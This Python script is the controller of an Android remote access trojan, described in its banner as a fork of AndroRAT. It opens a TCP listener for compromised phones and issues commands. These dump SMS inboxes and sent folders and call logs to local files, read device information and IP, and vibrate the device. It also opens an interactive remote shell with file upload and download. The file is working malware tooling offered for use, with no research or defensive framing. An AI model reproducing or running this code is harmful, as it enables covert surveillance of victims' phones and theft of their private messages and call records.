#!/usr/bin/python

import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
import socket
import threading
import queue
import argparse

sys.stdout.reconfigure(encoding='utf-8')



banner = """\033[1m\033[96m
  __  __ _____ _______  __      ________ _____   _____ ______
 |  \/  |  ___|__   __|/\ \    / /  ____|  __ \ / ____|  ____|
 | \  / | |__    | |  /  \ \  / /| |__  | |__) | (___ | |__
 | |\/| |  __|   | | / /\ \ \/ / |  __| |  _  / \___ \|  __|
 | |  | | |___   | |/ ____ \  /  | |____| | \ \ ____) | |____
 |_|  |_|_____|  |_/_/    \_\/   |______|_|  \_\_____/|______|

\033[93m    A fork of AndroRAT by karma9874 for modern devices.\033[0m
"""


def _platform():
    if platform.system() == 'Windows':
        return lambda: os.system('cls'), "\\"
    return lambda: os.system('clear'), "/"

clear, direc = _platform()

if not os.path.isdir(os.getcwd() + direc + "Dumps"):
    os.makedirs("Dumps")


def getpwd(name):
    return os.getcwd() + direc + name


def tag(type_):
    colors = {
        "error":   ("31m", "ERROR"),
        "warning": ("33m", "WARNING"),
        "success": ("32m", "SUCCESS"),
    }
    if type_ == "info":
        return "\033[1m[\033[33mINFO\033[0m\033[1m] "
    col, label = colors[type_]
    return f"\033[1m[\033[{col}{label}\033[0m\033[1m]\033[0m "


def animate(msg):
    for ch in "/—\\|":
        sys.stdout.write(f"\r{tag('info')}\033[1m{msg}\033[31m{ch}\033[0m")
        time.sleep(0.1)
        sys.stdout.flush()


def recvall(sock):
    buf = ""
    while "END123" not in buf:
        buf += sock.recv(4096).decode("UTF-8", "ignore")
    return buf


def recvall_shell(sock):
    buf, data = "", ""
    ready = select.select([sock], [], [], 3)
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8", "ignore")
            buf += data
        else:
            return "bogus"
    return buf



def handle_sms(client, folder):
    print(tag("info") + f"\033[0mFetching {folder} SMS …")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = f"Dumps{direc}{folder}_{timestr}.txt"
    msg = recvall(client)
    try:
        with open(filename, 'w', errors="ignore", encoding="utf-8") as f:
            f.write(msg)
        print(tag("success") + "Saved → \033[1m\033[32m" + getpwd(filename) + "\n")
    except UnicodeDecodeError:
        print(tag("error") + "Unable to decode SMS\n")
        if os.path.exists(filename):
            os.remove(filename)


def handle_call_logs(client):
    print(tag("info") + "\033[0mFetching call logs …")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = f"Dumps{direc}Call_Logs_{timestr}.txt"
    if "No call logs" in msg:
        print(msg.replace("END123", "").strip())
        print()
    else:
        with open(filename, 'w', errors="ignore", encoding="utf-8") as f:
            f.write(msg)
        print(tag("success") + "Saved → \033[1m\033[32m" + getpwd(filename) + "\033[0m")
        if not os.path.getsize(filename):
            os.remove(filename)


def _get_file(filename, ext, data):
    dest = f"Dumps{direc}{filename}.{ext}"
    try:
        with open(dest, 'wb') as f:
            f.write(base64.b64decode(data))
        print(tag("success") + "Downloaded → \033[1m\033[32m" + getpwd(dest) + "\n")
    except binascii.Error:
        print(tag("error") + "Could not decode file")
        if os.path.exists(dest):
            os.remove(dest)


def _put_file(filename):
    return base64.b64encode(open(filename, "rb").read())


def handle_shell(client, last_cmd):
    """Interactive device shell."""
    while True:
        msg = recvall_shell(client)

        if "getFile" in msg:
            raw = recvall(client).replace("\nEND123\n", "")
            parts = raw.split("|_|")
            _get_file(parts[0], parts[1], parts[2])

        if "putFile" in msg:
            fname = last_cmd[0].split(" ")[1].strip() if last_cmd else ""
            if pathlib.Path(fname).exists():
                enc = _put_file(fname).decode("UTF-8")
                parts = fname.split(".")
                client.send(
                    ("putFile" + "<" + parts[0] + "<" + parts[1] + "<" + enc + "END123\n")
                    .encode("UTF-8")
                )
                print(tag("success") + f"\033[32mUploaded {fname} → /sdcard/temp/")
            else:
                print(tag("error") + "File not found")

        if "Exiting" in msg:
            print("\033[1m\033[33m--- Exiting Shell ---\n")
            return

        for line in msg.split("\n")[:-2]:
            print(line)
        print()

        cmd = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
        last_cmd[0] = cmd
        cmd += "\n"
        if cmd.strip() == "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(cmd.encode("UTF-8"))


def print_help():
    print("""
    Commands
    ────────────────────────────────────────────
    deviceInfo              device info
    getSMS [inbox|sent]     dump SMS to file
    getCallLogs             dump call log to file
    getIP                   device IP address
    vibrate [number]        vibrates the device for given times
    shell                   interactive device shell
    help                    show this menu
    clear                   clear screen
    exit                    disconnect & quit
    ────────────────────────────────────────────
    """)



def _accept_connection(sock, q):
    conn, addr = sock.accept()
    q.put((conn, addr))


def run_controller(ip, port):
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        print(tag("error") + f"\033[1m{e}")
        sys.exit(1)

    soc.listen(2)
    print(banner)

    while True:
        q = queue.Queue()
        t = threading.Thread(target=_accept_connection, args=[soc, q], daemon=True)
        t.start()
        while t.is_alive():
            animate("Waiting for connection  ")
        t.join()

        conn, addr = q.get()
        clear()
        print(tag("success") + f"Connected → \033[1m\033[32m{addr}\033[0m\n")

        last_cmd = [""]

        while True:
            try:
                msg = conn.recv(4024).decode("UTF-8").strip()
            except Exception:
                print(tag("error") + "Connection lost")
                break


            if "readSMS" in msg:
                folder = msg.split(" ")[1] if " " in msg else "inbox"
                handle_sms(conn, folder)
            elif msg == "SHELL":
                handle_shell(conn, last_cmd)
            elif msg == "callLogs":
                handle_call_logs(conn)
            elif msg == "help":
                print_help()
            else:
                if "Unknown Command" in msg:
                    print(tag("error") + msg)
                elif "Hello there" in msg:
                    print("\033[1m" + msg)
                else:
                    print(msg)

            # ── prompt ──
            try:
                cmd = input("\033[1m\033[36mMETAVERSE:/> \033[0m").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            last_cmd[0] = cmd

            if cmd == "exit":
                conn.send((cmd + "\n").encode("UTF-8"))
                print("\n\033[1m\033[32m  Bye! (∗ ･‿･)ﾉ゛\033[0m\n")
                sys.exit(0)

            if cmd == "clear":
                conn.send("test\n".encode("UTF-8"))
                clear()
                continue

            if cmd == "help":
                print_help()
                conn.send("\n".encode("UTF-8"))
                continue

            conn.send((cmd + "\n").encode("UTF-8"))



def main():
    parser = argparse.ArgumentParser(
        prog="control.py",
        usage="%(prog)s -i <IP> -p <PORT>",
        description="METAVERSE – Android Remote Controller"
    )
    parser.add_argument('-i', '--ip',   metavar="<IP>",   required=True,  help="Listener IP (use 0.0.0.0 to bind all)")
    parser.add_argument('-p', '--port', metavar="<PORT>", required=True,  help="Listener port")
    args = parser.parse_args()


    if args.ip != "0.0.0.0":
        ip_re = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", args.ip)
        if not ip_re or not all(0 <= int(n) <= 255 for n in ip_re.groups()):
            print(tag("error") + "Invalid IP address")
            sys.exit(1)

    if not args.port.isdigit() or not (1 <= int(args.port) <= 65535):
        print(tag("error") + "Invalid port number")
        sys.exit(1)

    run_controller(args.ip, args.port)


if __name__ == "__main__":
    main()
